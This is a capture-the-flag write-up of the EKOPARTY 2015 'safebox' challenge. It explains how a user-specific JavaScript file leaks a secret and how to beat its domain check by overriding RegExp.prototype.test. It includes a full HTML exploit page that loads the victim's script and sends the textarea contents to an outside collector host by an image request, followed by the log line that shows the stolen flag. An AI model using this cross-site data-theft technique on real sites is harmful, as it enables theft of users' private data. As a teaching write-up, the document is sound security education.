### Solved by Swappage

This 200 points challenge was a really nice javascript and client-side security related task.

The website was allowing users to register and upon login it was possible to write some text in a text area and save it for future displaying.

Another function available in the web site was the possibility to submit an URL for review by the site administrator (in a sort of whistleblowing-like platform).

The objective of the task was to steal the administrator secret textarea content.

By logging off and on again from a different browser, the text area content was preserved, which suggested that this information was saved server side somewhere, but where?

By inspecting the page source code it was possible to spot a *file.js* which happened to contain the following code:

```javascript
function getCookie(cname) {
    var name = cname + "=";
    var ca = document.cookie.split(';');
    for(var i=0; i<ca.length; i++) {
        var c = ca[i];
        while (c.charAt(0)==' ') c = c.substring(1);
        if (c.indexOf(name) == 0) return c.substring(name.length,c.length);
    }
    return "";
}

function setCookie(cname, cvalue, exdays) {
    var d = new Date();
    d.setTime(d.getTime() + (exdays*24*60*60*1000));
    var expires = "expires="+d.toUTCString();
    document.cookie = cname + "=" + cvalue + "; " + expires;
}


function isSubDomain(c) {
    var d = document.domain;
    var r = new RegExp(c+"$").test(d);
    return r;
}

function saveSecret() {
    var s = document.getElementById('secretbox').value;
    setCookie('secret', encrypt(s),3);
}

function decrypt(data) {
    if (data=="") return "";
    return window.atob(data);
}

function encrypt(data) {
    return window.btoa(data);
}

function checkDomain(c) {
    var d = document.domain;
    var r = false;
    if(d == c) {
        r = true;
    } else {
        r = isSubDomain(c);
    }
    return r;
}

if(checkDomain("challs.ctf.site"))  {
    document.getElementById('secretbox').value = decrypt('aGVsbG8gd29ybGQK');
} else {
    console.log("error");
}
```
A couple of interesting things are happening here:

- The javascript is responsible for populating the text area with our code
- before populating the text area it uses some functions to verify that the domain from which the script is included is *challs.ctf.site* or a subdomain.

How can this be exploited?

Considering what we just said, the javascript is dynamically generated by the web application depending on the account data; this means that as long as the user is logged in to the application, the javascript will be loaded with the informations about the form content populated accordingly.

At this point what we can do is submit a link to a web page that we control, which includes the javascript from the server.
This would load the content into the user browser, and since now the data is completely accessible by the client, we can manipulate it and possibly grab it.

There is only one problem to solve: the javascript checks the domain from which the javascript is loaded.

But let's look at the function that actually checks for the subdomain: it uses the function *regExp.test()*.

This function is global and not defined in the js, therefore, what we can do is override it with a prototype in our code and force it to return always true, effectively nullifying the check.

At this point, what happens is that when the admin visits our page, his personal javascript is loaded, with the informations related to the form content loaded within it, while our code will take care of grabbing the content of a text area we properly set up with the same name as the original one.

The following code is the exploit i used to grab the secret message (the flag).

```html
<!DOCTYPE html>
<html class="full">
    <head>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
        <meta name="description" content="EKOPARTY PRE-CTF 2015">
        <meta name="author" content="NULL Life">

        <!-- Latest compiled and minified CSS -->
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css">
        <link rel="stylesheet" href="/static/css/ctf.css" type="text/css"/>

        <link rel="shortcut icon" href="/static/img/favicon.ico">
        <link rel="stylesheet" type="text/css" href="//fonts.googleapis.com/css?family=Open+Sans" />

        <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
        <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>

        <title>safebox</title>
    </head>
<body>

<script>
    RegExp.prototype.test = function(d) { return true; }
</script>

<textarea id=secretbox name=secretbox style="width: 70%; " rows=10> </textarea>

<script src=http://challs.ctf.site:10000/safebox/file.js></script>

<script>
    document.write('<img src="http://xxx.xxx.xxx.xxx/collect.gif?cookie=' + document.getElementById('secretbox').value + '" />')
</script>
</body>
</html>
```

and here is the result

    52.20.148.242 - - [14/Sep/2015:23:30:37 +0200] "GET /collect.gif?cookie=EKO%7Bclient_side_security_for_the_lulz%7D

